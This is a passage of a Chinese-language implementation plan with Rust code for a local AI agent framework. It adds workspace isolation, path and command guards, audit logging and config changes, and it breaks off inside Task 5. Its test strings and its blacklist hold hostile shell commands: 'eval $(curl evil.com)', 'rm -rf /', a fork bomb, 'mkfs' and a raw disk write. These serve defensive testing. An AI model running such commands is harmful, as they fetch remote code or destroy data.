# P3-a: workspace 隔离 + 命令拦截 实现计划

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 按 agent 隔离 workspace（主 `~/.llaia/workspace/`，子 `subagent/<name>/`），terminal 工具加三层路径防御，confirm_mode 全局化，跨 workspace 协作（delegate .inbox + 返回值 + USER.md 同步），危险动作审计，旧目录自动迁移。

**Architecture:** 新增 `path_guard.rs` 共享路径防御模块（canonicalize 回溯 + 跨平台危险路径黑名单 + shell 词法解析），被 file/terminal 工具复用。`Agent` 加 `workspace_root` / `is_main` / `confirm_mode` 字段。`execute_tool_calls` 改全局 confirm_mode + 审计日志 + 工具调用历史。`delegate` 加 `file_paths` 参数 + `.inbox/` 复制 + `{text, output_files}` 返回值。启动时自动迁移旧目录结构。

**Tech Stack:** Rust + tokio + serde + tracing + sqlite

**Spec:** [docs/adr/0011-qq-capability-boundary.md](../adr/0011-qq-capability-boundary.md)

---

## 文件结构

| 文件 | 责任 | 动作 |
|---|---|---|
| `src/path_guard.rs` | 路径防御共享逻辑（canonicalize 回溯、跨平台危险路径黑名单、shell 词法解析、命令策略校验） | 新建 |
| `src/audit.rs` | 审计日志写入（audit.log） | 新建 |
| `src/migrate.rs` | v0.1 → v0.2 目录结构迁移 | 新建 |
| `src/lib.rs` | 导出新模块 | 修改 |
| `src/config.rs` | TerminalConfig 加 command_policy/command_whitelist；QqConfig.confirm_mode 默认改 none + whitelist 废弃；AgentConfig 加自动推导方法；default_for_workspace 生成新结构 | 修改 |
| `src/agent/mod.rs` | Agent 加 workspace_root/is_main/confirm_mode 字段；Agent::new 签名变更；handle_message_streaming 传新参数 | 修改 |
| `src/agent/runner.rs` | execute_tool_calls 改全局 confirm_mode + 审计 + 工具调用历史 | 修改 |
| `src/tools/file.rs` | 用 path_guard + 主 agent subagent 权限分层 | 修改 |
| `src/tools/terminal.rs` | 用 path_guard 三层防御 + command_policy | 修改 |
| `src/tools/memory.rs` | 加 is_main 标识，子 agent 拒写 USER.md | 修改 |
| `src/tools/delegate.rs` | 加 file_paths 参数 + .inbox 复制 + {text, output_files} 返回值 | 修改 |
| `src/channels/cli.rs` | build_single_agent 用自动推导 workspace + USER.md 同步 + 工具构造用新字段 | 修改 |
| `src/channels/qq.rs` | 移除 per-channel confirm 逻辑 | 修改 |
| `src/commands/mod.rs` | 启动时调迁移 + doctor 更新 + remember_cmd 用自动推导 | 修改 |

---

## Task 1: path_guard 共享模块

**Files:**
- Create: `src/path_guard.rs`
- Modify: `src/lib.rs`

- [ ] **Step 1: 创建 src/path_guard.rs**

```rust
use anyhow::{anyhow, Result};
use std::path::{Path, PathBuf};

/// 跨平台危险路径黑名单前缀（canonicalize 失败时兜底）
pub fn dangerous_prefixes() -> Vec<&'static str> {
    let mut v = vec![];
    #[cfg(target_os = "linux")]
    {
        v.extend_from_slice(&[
            "/root", "/usr", "/bin", "/sbin", "/etc", "/var", "/boot",
            "/proc", "/sys", "/dev", "/lib", "/lib64",
        ]);
    }
    #[cfg(target_os = "macos")]
    {
        v.extend_from_slice(&[
            "/System", "/Library", "/usr", "/private", "/bin", "/sbin",
            "/etc", "/var", "/dev",
        ]);
    }
    #[cfg(windows)]
    {
        v.extend_from_slice(&[
            r"C:\Windows", r"C:\Program Files", r"C:\Program Files (x86)",
            r"C:\ProgramData", r"C:\System Volume Information",
        ]);
    }
    v
}

/// 判断路径是否命中危险黑名单前缀（大小写不敏感，Windows 路径统一小写比较）
pub fn hits_blacklist(path: &str) -> bool {
    let lower = path.to_lowercase().replace('/', "\\");
    for prefix in dangerous_prefixes() {
        let prefix_lower = prefix.to_lowercase();
        if lower.starts_with(&prefix_lower) {
            return true;
        }
    }
    false
}

/// canonicalize 回溯：路径不存在时回溯父目录直到存在的祖先，返回祖先的 canonicalize 路径
/// 如果整个回溯都失败（连根都不存在），返回 None
fn canonicalize_ancestor(path: &Path) -> Option<PathBuf> {
    let mut current = path;
    loop {
        if let Ok(canon) = std::fs::canonicalize(current) {
            return Some(canon);
        }
        current = match current.parent() {
            Some(p) if p != current => p,
            _ => return None,
        };
    }
}

/// 词法规范化（处理 . 和 ..，不依赖文件系统）
fn normalize_lexical(p: &Path) -> PathBuf {
    use std::path::Component;
    let mut out = PathBuf::new();
    for comp in p.components() {
        match comp {
            Component::Prefix(_) | Component::RootDir => out.push(comp.as_os_str()),
            Component::CurDir => {}
            Component::ParentDir => { out.pop(); }
            Component::Normal(c) => out.push(c),
        }
    }
    out
}

/// 校验路径是否落在 workspace 内（第二层白名单 + 第三层黑名单兜底）
///
/// - 相对路径以 workspace 为基准
/// - 绝对路径 canonicalize 后必须 starts_with workspace
/// - canonicalize 失败时回溯祖先检查
/// - 命中危险黑名单前缀一律拒绝
///
/// `extra_readable`：额外允许读取的目录（如主 agent 读 subagent/，传入 workspace/subagent/）
/// `writable`：true 表示写操作校验（更严格，不允许写 extra_readable 之外的限制区域）
pub fn validate_path(
    workspace: &Path,
    path: &str,
    extra_readable: Option<&Path>,
) -> Result<PathBuf> {
    // 第三层：黑名单兜底（先查字符串前缀）
    if hits_blacklist(path) {
        anyhow::bail!("path {:?} matches dangerous blacklist prefix", path);
    }

    let p = PathBuf::from(path);
    let joined = if p.is_absolute() {
        p
    } else {
        workspace.join(path)
    };
    let norm_joined = normalize_lexical(&joined);
    let norm_ws = normalize_lexical(workspace);

    // canonicalize 校验：存在则直接比，不存在回溯祖先
    let canon_to_check = match std::fs::canonicalize(&norm_joined) {
        Ok(c) => c,
        Err(_) => {
            // 路径不存在：回溯祖先
            match canonicalize_ancestor(&norm_joined) {
                Some(c) => c,
                // 祖先也不存在（如纯相对路径在空 workspace）：用词法规范化结果
                None => norm_joined.clone(),
            }
        }
    };

    // 第二层：白名单（canonicalize 后必须 starts_with workspace 或 extra_readable）
    if canon_to_check.starts_with(&norm_ws) {
        return Ok(norm_joined);
    }
    if let Some(extra) = extra_readable {
        let norm_extra = normalize_lexical(extra);
        if canon_to_check.starts_with(&norm_extra) {
            return Ok(norm_joined);
        }
    }

    anyhow::bail!(
        "path {:?} (canonicalized {:?}) is outside workspace {:?}",
        joined, canon_to_check, norm_ws
    )
}

/// 判断 token 是否"看起来像路径"（用于 terminal 命令行路径提取）
fn looks_like_path(token: &str) -> bool {
    token.starts_with('/')
        || token.starts_with('~')
        || token.starts_with("./")
        || token.starts_with("../")
        || (token.len() >= 2 && token.as_bytes()[1] == b':') // Windows 盘符 C:
        || token.contains(std::path::MAIN_SEPARATOR)
}

/// 从命令行字符串提取所有路径 token
pub fn extract_path_tokens(command: &str) -> Vec<String> {
    command
        .split_whitespace()
        .filter(|t| looks_like_path(t))
        .map(|s| s.to_string())
        .collect()
}

/// 第一层：shell 包装拒绝。返回 Ok(()) 表示通过，Err 表示拒绝
pub fn check_shell_wrappers(command: &str) -> Result<()> {
    let tokens: Vec<&str> = command.split_whitespace().collect();
    if tokens.is_empty() {
        return Ok(());
    }

    // 首 token 是 bash/sh/zsh/fish 且含 -c
    let first = tokens[0];
    let shell_names = ["bash", "sh", "zsh", "fish"];
    if shell_names.contains(&first) && tokens.iter().any(|t| *t == "-c") {
        anyhow::bail!("shell wrapper with -c is blocked: {}", command);
    }

    // 命令行含 eval / exec / source / $() / 反引号 / 进程替换 >( ) <( )
    if command.contains("eval ")
        || command.contains("exec ")
        || command.contains("source ")
        || command.contains("$(")
        || command.contains('`')
        || command.contains(">(")
        || command.contains("<(")
    {
        anyhow::bail!("command contains blocked shell construct: {}", command);
    }

    Ok(())
}

/// 校验 terminal 命令的路径安全性（第二层 + 第三层）
///
/// 提取命令行所有路径 token，校验每个都落在 workspace 内
pub fn validate_command_paths(command: &str, workspace: &Path) -> Result<()> {
    for token in extract_path_tokens(command) {
        validate_path(workspace, &token, None)?;
    }
    Ok(())
}

/// 命令黑名单（内置，不可配）
pub const COMMAND_BLACKLIST: &[&str] = &[
    "rm -rf /",
    "rm -rf ~",
    "sudo",
    "su ",
    "shutdown",
    "reboot",
    "kill -9 1",
    "dd if=",
    "mkfs",
    ":(){:|:&};:",
    ">/dev/sda",
    "chmod -R 777 /",
];

/// 检查命令是否命中黑名单
pub fn hits_command_blacklist(command: &str) -> bool {
    let lower = command.to_lowercase();
    COMMAND_BLACKLIST.iter().any(|bl| lower.contains(bl))
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::tempdir;

    #[test]
    fn test_hits_blacklist_linux() {
        assert!(hits_blacklist("/etc/passwd"));
        assert!(hits_blacklist("/usr/bin/something"));
        assert!(!hits_blacklist("/home/user/file.txt"));
    }

    #[test]
    fn test_hits_blacklist_windows() {
        assert!(hits_blacklist(r"C:\Windows\System32"));
        assert!(hits_blacklist(r"C:\Program Files\app"));
        assert!(!hits_blacklist(r"C:\Users\me\file.txt"));
    }

    #[test]
    fn test_validate_path_within_workspace() {
        let ws = tempdir().unwrap();
        let ws_path = ws.path();
        // 相对路径
        let r = validate_path(ws_path, "test.txt", None).unwrap();
        assert!(r.starts_with(ws_path));

        // 绝对路径在 workspace 内
        let abs = ws_path.join("sub/file.txt");
        let r = validate_path(ws_path, abs.to_str().unwrap(), None).unwrap();
        assert!(r.starts_with(ws_path));
    }

    #[test]
    fn test_validate_path_outside_workspace() {
        let ws = tempdir().unwrap();
        let ws_path = ws.path();
        // .. 逃逸
        let result = validate_path(ws_path, "../outside.txt", None);
        assert!(result.is_err());

        // 绝对路径指向外部
        let outside = ws_path.parent().unwrap().join("outside.txt");
        let result = validate_path(ws_path, outside.to_str().unwrap(), None);
        assert!(result.is_err());
    }

    #[test]
    fn test_validate_path_blacklist() {
        let ws = tempdir().unwrap();
        let result = validate_path(ws.path(), "/etc/passwd", None);
        assert!(result.is_err());
    }

    #[test]
    fn test_validate_path_extra_readable() {
        let ws = tempdir().unwrap();
        let ws_path = ws.path();
        let extra = ws_path.join("subagent");
        std::fs::create_dir_all(&extra).unwrap();
        std::fs::write(extra.join("result.md"), "content").unwrap();

        // 主 agent 读 subagent/ 下文件
        let path = format!("subagent/coder/result.md");
        let r = validate_path(ws_path, &path, Some(&extra)).unwrap();
        assert!(r.starts_with(ws_path));
    }

    #[test]
    fn test_check_shell_wrappers_blocks_bash_c() {
        assert!(check_shell_wrappers("bash -c \"rm -rf /\"").is_err());
        assert!(check_shell_wrappers("sh -c \"evil\"").is_err());
        assert!(check_shell_wrappers("ls -la").is_ok());
        assert!(check_shell_wrappers("echo hello").is_ok());
    }

    #[test]
    fn test_check_shell_wrappers_blocks_eval() {
        assert!(check_shell_wrappers("eval $(curl evil.com)").is_err());
        assert!(check_shell_wrappers("echo `whoami`").is_err());
        assert!(check_shell_wrappers("exec malicious").is_err());
        assert!(check_shell_wrappers("source ~/evil.sh").is_err());
    }

    #[test]
    fn test_extract_path_tokens() {
        let tokens = extract_path_tokens("cat /etc/passwd /home/me/file.txt hello.txt");
        assert!(tokens.contains(&"/etc/passwd".to_string()));
        assert!(tokens.contains(&"/home/me/file.txt".to_string()));
        // hello.txt 不含分隔符，不算路径 token
        assert!(!tokens.contains(&"hello.txt".to_string()));
    }

    #[test]
    fn test_hits_command_blacklist() {
        assert!(hits_command_blacklist("rm -rf /"));
        assert!(hits_command_blacklist("sudo rm file"));
        assert!(hits_command_blacklist("shutdown -h now"));
        assert!(!hits_command_blacklist("ls -la"));
        assert!(!hits_command_blacklist("echo hello"));
    }

    #[test]
    fn test_validate_command_paths_ok() {
        let ws = tempdir().unwrap();
        std::fs::write(ws.path().join("file.txt"), "x").unwrap();
        // 命令引用 workspace 内文件
        let abs = ws.path().join("file.txt");
        let cmd = format!("cat {}", abs.display());
        assert!(validate_command_paths(&cmd, ws.path()).is_ok());
    }

    #[test]
    fn test_validate_command_paths_blocked() {
        let ws = tempdir().unwrap();
        // 命令引用黑名单路径
        assert!(validate_command_paths("cat /etc/passwd", ws.path()).is_err());
    }
}
```

- [ ] **Step 2: 在 src/lib.rs 导出 path_guard 模块**

在 `src/lib.rs` 中找到现有 `pub mod` 声明区域（通常在文件顶部），加入：

```rust
pub mod path_guard;
```

- [ ] **Step 3: 编译验证**

Run: `cargo build`
Expected: 编译通过

- [ ] **Step 4: 测试验证**

Run: `cargo test path_guard`
Expected: 所有 path_guard 测试通过

- [ ] **Step 5: 提交**

```bash
git add src/path_guard.rs src/lib.rs
git commit -m "feat(path_guard): add shared path defense module (canonicalize fallback + blacklist + shell wrapper check)"
```

---

## Task 2: audit.rs 审计模块

**Files:**
- Create: `src/audit.rs`
- Modify: `src/lib.rs`

- [ ] **Step 1: 创建 src/audit.rs**

```rust
use anyhow::Result;
use std::path::PathBuf;
use std::sync::Mutex;
use tokio::fs::OpenOptions;
use tokio::io::AsyncWriteExt;

/// 审计日志写入器：追加写入 ~/.llaia/logs/audit.log
pub struct AuditLog {
    path: PathBuf,
    /// 串行化写入（避免并发交错）
    lock: Mutex<()>,
}

impl AuditLog {
    pub fn new(log_dir: &PathBuf) -> Self {
        std::fs::create_dir_all(log_dir).ok();
        Self {
            path: log_dir.join("audit.log"),
            lock: Mutex::new(()),
        }
    }

    /// 写入一条审计记录
    ///
    /// - `agent`：agent 名（main / 子 agent alias）
    /// - `channel`：触发渠道（cli / qq / web / delegate / cron）
    /// - `tool`：工具名
    /// - `args`：工具参数（JSON 字符串）
    /// - `result`：ok / blocked / error
    /// - `reason`：失败原因（可选）
    pub async fn write(
        &self,
        agent: &str,
        channel: &str,
        tool: &str,
        args: &str,
        result: &str,
        reason: Option<&str>,
    ) -> Result<()> {
        let _g = self.lock.lock().unwrap();
        let timestamp = chrono::Local::now().to_rfc3339();
        let mut line = format!(
            "{} agent={} channel={} tool={} args={} result={}",
            timestamp, agent, channel, tool, args, result
        );
        if let Some(r) = reason {
            line.push_str(&format!(" reason={}", r));
        }
        line.push('\n');

        let mut file = OpenOptions::new()
            .create(true)
            .append(true)
            .open(&self.path)
            .await?;
        file.write_all(line.as_bytes()).await?;
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::tempdir;

    #[tokio::test]
    async fn test_audit_write() {
        let dir = tempdir().unwrap();
        let audit = AuditLog::new(&dir.path().to_path_buf());
        audit
            .write("main", "qq", "terminal", r#"{"cmd":"ls"}"#, "ok", None)
            .await
            .unwrap();

        let content = tokio::fs::read_to_string(dir.path().join("audit.log"))
            .await
            .unwrap();
        assert!(content.contains("agent=main"));
        assert!(content.contains("tool=terminal"));
        assert!(content.contains("result=ok"));
    }

    #[tokio::test]
    async fn test_audit_write_with_reason() {
        let dir = tempdir().unwrap();
        let audit = AuditLog::new(&dir.path().to_path_buf());
        audit
            .write(
                "main",
                "qq",
                "terminal",
                r#"{"cmd":"rm -rf /"}"#,
                "blocked",
                Some("blacklist"),
            )
            .await
            .unwrap();

        let content = tokio::fs::read_to_string(dir.path().join("audit.log"))
            .await
            .unwrap();
        assert!(content.contains("result=blocked"));
        assert!(content.contains("reason=blacklist"));
    }
}
```

- [ ] **Step 2: 在 src/lib.rs 导出 audit 模块**

```rust
pub mod audit;
```

- [ ] **Step 3: 编译 + 测试**

Run: `cargo test audit`
Expected: 通过

- [ ] **Step 4: 提交**

```bash
git add src/audit.rs src/lib.rs
git commit -m "feat(audit): add audit.log writer for side-effect tool calls"
```

---

## Task 3: config.rs schema 变更

**Files:**
- Modify: `src/config.rs`

- [ ] **Step 1: TerminalToolConfig 加 command_policy / command_whitelist**

在 `src/config.rs` 找到 `TerminalToolConfig` 结构体（约 215 行），改为：

```rust
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TerminalToolConfig {
    #[serde(default = "default_confirm")]
    pub confirm: String,
    #[serde(default = "default_whitelist")]
    pub whitelist: Vec<String>,
    /// 命令策略：blacklist（默认）/ whitelist / none
    #[serde(default = "default_command_policy")]
    pub command_policy: String,
    /// 仅 policy=whitelist 时生效
    #[serde(default = "default_command_whitelist")]
    pub command_whitelist: Vec<String>,
}

impl Default for TerminalToolConfig {
    fn default() -> Self {
        Self {
            confirm: default_confirm(),
            whitelist: default_whitelist(),
            command_policy: default_command_policy(),
            command_whitelist: default_command_whitelist(),
        }
    }
}

fn default_confirm() -> String {
    "whitelist".into()
}

fn default_whitelist() -> Vec<String> {
    vec![
        "ls".into(),
        "cat".into(),
        "grep".into(),
        "pwd".into(),
        "dir".into(),
    ]
}

fn default_command_policy() -> String {
    "blacklist".into()
}

fn default_command_whitelist() -> Vec<String> {
    Vec::new()
}
```

- [ ] **Step 2: QqConfig.confirm_mode 默认改 none + whitelist 废弃**

在 `src/config.rs` 找到 `default_qq_confirm` 函数（约 169 行），改为：

```rust
fn default_qq_confirm() -> String {
    "none".into()
}
```

在 `Config::load` 方法（约 253 行）的 `expand_paths` 调用之前，加 whitelist 废弃处理：

```rust
pub fn load(path: &PathBuf) -> Result<Self> {
    let content = std::fs::read_to_string(path)
        .with_context(|| format!("failed to read config: {:?}", path))?;
    let mut config: Config = toml::from_str(&content)
        .with_context(|| format!("failed to parse config: {:?}", path))?;
    // log.dir 未显式配置时（仍为 serde 默认值），跟随 config 文件所在目录
    if config.log.dir == default_log_dir() {
        if let Some(parent) = path.parent() {
            config.log.dir = parent.join("logs").to_string_lossy().into_owned();
        }
    }
    // whitelist confirm_mode 废弃：warn + fallback 到 none
    if config.channels.qq.confirm_mode == "whitelist" {
        tracing::warn!("channels.qq.confirm_mode = \"whitelist\" is deprecated, falling back to \"none\"");
        config.channels.qq.confirm_mode = "none".into();
    }
    config.expand_paths()?;
    Ok(config)
}
```

- [ ] **Step 3: AgentConfig 加 workspace 自动推导方法**

在 `src/config.rs` 找到 `AgentConfig` 结构体（约 107 行），保持字段不变但加注释标记 deprecated，并加自动推导方法：

```rust
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentConfig {
    /// 引用 "provider_id.model_alias"，例如 "default.qwen3"
    pub model: String,
    /// [deprecated] 该 agent 的 md 文件根目录。P3-a 起自动推导：
    ///   main → <config_dir>/workspace/
    ///   子 agent → <config_dir>/workspace/subagent/<alias>/
    /// 字段保留向后兼容，加载时 warn 并用自动推导值覆盖
    pub workspace: String,
    /// [deprecated] 缺省时从 workspace 推导为 <workspace>/SOUL.md 等
    pub soul: Option<String>,
    pub user: Option<String>,
    pub memory: Option<String>,
    /// 工具黑名单：列出的工具子 Agent 不可用。默认空（继承所有工具）
    #[serde(default)]
    pub denied_tools: Vec<String>,
    /// 委派超时秒数（仅子 Agent 生效）。默认 120
    #[serde(default = "default_delegate_timeout")]
    pub delegate_timeout: u64,
}

impl AgentConfig {
    /// 推导 agent workspace 根路径
    /// main → config_dir/workspace/
    /// 子 agent → config_dir/workspace/subagent/<alias>/
    pub fn derive_workspace(&self, config_dir: &std::path::Path, alias: &str) -> PathBuf {
        if alias == "main" {
            config_dir.join("workspace")
        } else {
            config_dir.join("workspace").join("subagent").join(alias)
        }
    }
}
```

- [ ] **Step 4: default_for_workspace 生成新目录结构**

在 `src/config.rs` 找到 `default_for_workspace` 方法（约 303 行），改为生成新结构（workspace 子目录）：

```rust
/// 默认配置（首次启动用），结构最小化
/// config_dir 指向 ~/.llaia/，主 agent workspace 自动推导为 ~/.llaia/workspace/
pub fn default_for_workspace(config_dir: &str) -> Self {
    let config_dir = shellexpand::tilde(config_dir).into_owned();
    let config_dir_path = std::path::PathBuf::from(&config_dir);
    let ws = config_dir_path.join("workspace");

    let mut provider: HashMap<String, ProviderConfig> = HashMap::new();
    let mut models: HashMap<String, ModelConfig> = HashMap::new();
    models.insert(
        "qwen".into(),
        ModelConfig {
            model: "qwen2.5:7b".into(),
            native_tool_calling: true,
            context_size: None,
        },
    );
    provider.insert(
        "default".into(),
        ProviderConfig {
            provider_type: "openai_compatible".into(),
            base_url: "http://localhost:11434/v1".into(),
            api_key: String::new(),
            model: models,
        },
    );

    let mut agent: HashMap<String, AgentConfig> = HashMap::new();
    agent.insert(
        "main".into(),
        AgentConfig {
            model: "default.qwen".into(),
            workspace: ws.to_string_lossy().into_owned(),
            soul: None,
            user: None,
            memory: None,
            denied_tools: Vec::new(),
            delegate_timeout: default_delegate_timeout(),
        },
    );

    Config {
        runtime: RuntimeConfig::default(),
        log: LogConfig {
            level: default_level(),
            dir: format!("{}/logs", config_dir),
        },
        provider,
        agent,
        channels: ChannelsConfig::default(),
        tools: ToolsConfig::default(),
    }
}
```

注意：方法签名从 `default_for_workspace(workspace_dir: &str)` 改为 `default_for_workspace(config_dir: &str)`，语义从"workspace 目录"改为"配置根目录"。

- [ ] **Step 5: 更新现有测试中的 default_for_workspace 调用**

`src/config.rs` 测试中所有 `Config::default_for_workspace("~/.llaia")` 调用语义变化：现在 `~/.llaia` 被视为 config_dir，主 agent workspace 自动推导为 `~/.llaia/workspace`。

更新 `test_default_config` 测试：

```rust
#[test]
fn test_default_config() {
    let config = Config::default_for_workspace("~/.llaia");
    let p = config.provider.get("default").unwrap();
    assert_eq!(p.provider_type, "openai_compatible");
    let m = p.model.get("qwen").unwrap();
    assert!(m.native_tool_calling);
    let a = config.agent.get("main").unwrap();
    assert_eq!(a.model, "default.qwen");
    assert!(a.soul.is_none());
    // workspace 现在推导为 ~/.llaia/workspace
    assert!(a.workspace.ends_with(".llaia/workspace"));
    assert_eq!(config.runtime.context_threshold, 0.7);
    assert_eq!(config.runtime.max_iterations, 10);
}
```

更新 `test_qq_config_defaults` 测试中的 confirm_mode 断言：

```rust
assert_eq!(config.channels.qq.confirm_mode, "none"); // 默认改为 none
```

更新 `test_qq_config_disabled_by_default` 测试：

```rust
assert_eq!(config.channels.qq.confirm_mode, "none");
```

更新 `test_minimal_config_uses_defaults` 测试中 workspace 相关断言（如有）。

- [ ] **Step 6: 加 whitelist 废弃测试**

在 `src/config.rs` 测试模块末尾加：

```rust
#[test]
fn test_whitelist_confirm_mode_deprecated() {
    let toml = r#"
[provider.default]
type = "openai_compatible"
base_url = "http://localhost:11434/v1"

[provider.default.qwen]
model = "qwen2.5:7b"

[agent.main]
model = "default.qwen"
workspace = "~/.llaia"

[channels.qq]
confirm_mode = "whitelist"
"#;
    let mut tmp = tempfile::NamedTempFile::new().unwrap();
    write!(tmp, "{}", toml).unwrap();
    let config = Config::load(&tmp.path().to_path_buf()).unwrap();
    assert_eq!(config.channels.qq.confirm_mode, "none"); // 废弃后 fallback
}
```

- [ ] **Step 7: 编译 + 测试**

Run: `cargo test config`
Expected: 所有 config 测试通过

- [ ] **Step 8: 提交**

```bash
git add src/config.rs
git commit -m "feat(config): add command_policy/command_whitelist to TerminalToolConfig; default confirm_mode to none; deprecate whitelist; add AgentConfig::derive_workspace"
```

---

## Task 4: Agent 结构变更

**Files:**
- Modify: `src/agent/mod.rs`

- [ ] **Step 1: Agent 加 workspace_root / is_main / confirm_mode 字段**

在 `src/agent/mod.rs` 找到 `Agent` 结构体（约 43 行），改为：

```rust
pub struct Agent {
    pub provider: Arc<dyn Provider>,
    pub tools: Arc<ToolRegistry>,
    pub context: Context,
    pub session_store: Arc<SessionStore>,
    pub session_id: i64,
    pub context_size: usize,
    pub context_threshold: f64,
    pub max_iterations: u32,
    /// 全局 confirm_mode（none / always / session），不再 per-channel
    pub confirm_mode: String,
    /// Agent 工作区根（工具能访问的"挂载根"）
    pub workspace: std::path::PathBuf,
    /// 配置根目录（~/.llaia/），agent 工具不可访问，但用于推导路径
    pub config_dir: std::path::PathBuf,
    /// 是否主 agent（决定能否读 subagent/）
    pub is_main: bool,
    /// agent 别名（main / 子 agent alias）
    pub alias: String,
    /// 审计日志（可选，测试时为 None）
    pub audit: Option<Arc<crate::audit::AuditLog>>,
    /// 本次 turn 的工具调用历史（供 delegate 提取产出文件清单）
    pub turn_tool_calls: Vec<TurnToolCall>,
}

/// 单次工具调用记录（用于 delegate 提取产出文件）
#[derive(Debug, Clone)]
pub struct TurnToolCall {
    pub name: String,
    pub args: serde_json::Value,
}
```

- [ ] **Step 2: 更新 Agent::new 签名**

```rust
impl Agent {
    #[allow(clippy::too_many_arguments)]
    pub async fn new(
        config: &Config,
        provider: Arc<dyn Provider>,
        tools: Arc<ToolRegistry>,
        session_store: Arc<SessionStore>,
        session_id: i64,
        system_prompt: String,
        context_size: usize,
        workspace: std::path::PathBuf,
        config_dir: std::path::PathBuf,
        is_main: bool,
        alias: String,
        audit: Option<Arc<crate::audit::AuditLog>>,
    ) -> Self {
        Self {
            provider,
            tools,
            context: Context::new(system_prompt),
            session_store,
            session_id,
            context_size,
            context_threshold: config.runtime.context_threshold,
            max_iterations: config.runtime.max_iterations,
            confirm_mode: config.channels.qq.confirm_mode.clone(),
            workspace,
            config_dir,
            is_main,
            alias,
            audit,
            turn_tool_calls: Vec::new(),
        }
    }
}
```

- [ ] **Step 3: handle_message_streaming 传新参数 + 清空 turn_tool_calls**

在 `src/agent/mod.rs` 找到 `handle_message_streaming` 方法（约 115 行），在方法开头清空 `turn_tool_calls`：

```rust
pub async fn handle_message_streaming(
    &mut self,
    user_msg: ChatMessage,
    channel: &str,
    event_tx: mpsc::Sender<TurnEvent>,
) -> Result<String> {
    // 清空本次 turn 的工具调用历史
    self.turn_tool_calls.clear();
    // ... 原有逻辑不变
```

在调用 `execute_tool_calls` 前，记录工具调用：

```rust
// 记录工具调用到 turn_tool_calls（供 delegate 提取产出文件）
for tc in &calls {
    self.turn_tool_calls.push(TurnToolCall {
        name: tc.name.clone(),
        args: tc.arguments.clone(),
    });
}

let tool_msgs = execute_tool_calls(
    &self.tools,
    &calls,
    channel,
    &self.confirm_mode,
    &self.alias,
    self.audit.clone(),
    Some(&event_tx),
)
.await?;
```

- [ ] **Step 4: 更新 make_agent_with_rounds 测试辅助函数**

```rust
async fn make_agent_with_rounds(native: bool, rounds: Vec<Vec<StreamEvent>>) -> Agent {
    let store = SessionStore::open_in_memory().unwrap();
    let sid = store.create_session("test", "test").unwrap();
    let provider: Arc<dyn Provider> = Arc::new(MockProvider::new(native, rounds));
    let tools = Arc::new(ToolRegistry::new());
    let config = Config::default_for_workspace("/tmp/llaia-test");
    Agent::new(
        &config,
        provider,
        tools,
        Arc::new(store),
        sid,
        "test system".into(),
        8192,
        std::path::PathBuf::from("/tmp/llaia-test/workspace"),
        std::path::PathBuf::from("/tmp/llaia-test"),
        true,
        "main".into(),
        None,
    )
    .await
}
```

- [ ] **Step 5: 更新 test_delegation_end_to_end 中的 Agent::new 调用**

主 agent 和子 agent 的 `Agent::new` 调用都要加新参数：

```rust
// 子 agent
let sub_agent = Agent::new(
    &config,
    sub_provider,
    sub_tools,
    Arc::new(sub_store),
    sub_sid,
    "sub soul".into(),
    8192,
    std::path::PathBuf::from("/tmp/llaia-test/workspace/subagent/coder"),
    std::path::PathBuf::from("/tmp/llaia-test"),
    false,
    "coder".into(),
    None,
).await;

// 主 agent
let main_agent = Agent::new(
    &config,
    main_provider,
    main_tools,
    Arc::new(main_store),
    main_sid,
    "main soul".into(),
    8192,
    std::path::PathBuf::from("/tmp/llaia-test/workspace"),
    std::path::PathBuf::from("/tmp/llaia-test"),
    true,
    "main".into(),
    None,
).await;
```

- [ ] **Step 6: 编译验证（预期有 runner.rs 调用错误，Task 7 修复）**

Run: `cargo build`
Expected: `execute_tool_calls` 调用处报参数不匹配错误（正常，Task 7 修复）

暂时不修复，继续下一个 task。

- [ ] **Step 7: 提交（允许中间状态编译失败，下一个 task 修复）**

```bash
git add src/agent/mod.rs
git commit -m "refactor(agent): add workspace_root/is_main/confirm_mode/audit/turn_tool_calls fields to Agent"
```

---

## Task 5: runner.rs confirm_mode 全局化 + 审计 + 工具调用历史

**Files:**
- Modify: `src/agent/runner.rs`

- [ ] **Step 1: execute_tool_calls 改签名 + 全局 confirm_mode + 审计**

将 `src/agent/runner.rs` 的 `execute_tool_calls` 函数整体替换为：

```rust
use crate::audit::AuditLog;
use crate::provider::{ChatMessage, ToolCall};
use crate::tools::Tool;
use anyhow::Result;
use std::collections::HashMap;
use std::sync::Arc;
use tokio::sync::mpsc;

pub struct ToolRegistry {
    tools: HashMap<String, Arc<dyn Tool>>,
}

impl Default for ToolRegistry {
    fn default() -> Self {
        Self::new()
    }
}

impl ToolRegistry {
    pub fn new() -> Self {
        Self {
            tools: HashMap::new(),
        }
    }
    pub fn register(&mut self, tool: Arc<dyn Tool>) {
        self.tools.insert(tool.name().to_string(), tool);
    }
    pub fn get(&self, name: &str) -> Option<&Arc<dyn Tool>> {
        self.tools.get(name)
    }
    pub fn specs(&self) -> Vec<crate::provider::ToolSpec> {
        self.tools.values().map(|t| t.spec()).collect()
    }
    pub fn names(&self) -> Vec<String> {
        self.tools.keys().cloned().collect()
    }
}

/// 执行工具调用。confirm_mode 为全局开关（不再 per-channel）。
/// audit：可选审计日志写入器
pub async fn execute_tool_calls(
    registry: &ToolRegistry,
    calls: &[ToolCall],
    channel: &str,
    confirm_mode: &str,
    agent_alias: &str,
    audit: Option<Arc<AuditLog>>,
    event_tx: Option<&mpsc::Sender<crate::agent::TurnEvent>>,
) -> Result<Vec<ChatMessage>> {
    let mut results = Vec::new();
    for call in calls {
        let tool = match registry.get(&call.name) {
            Some(t) => t,
            None => {
                tracing::warn!(tool = %call.name, "unknown tool");
                results.push(ChatMessage::tool(
                    format!("[error: unknown tool {}]", call.name),
                    &call.id,
                ));
                continue;
            }
        };

        // 全局 confirm_mode 检查（不再区分 channel）
        if tool.requires_confirm() && confirm_mode != "none" {
            // always / session 模式下，非 CLI channel 无法弹确认，拒绝
            if channel != "cli" {
                let msg = format!("该操作需在 CLI 确认：{}", call.name);
                tracing::warn!(tool = %call.name, mode = confirm_mode, channel, "blocked by confirm_mode");
                if let Some(a) = &audit {
                    let _ = a
                        .write(
                            agent_alias,
                            channel,
                            &call.name,
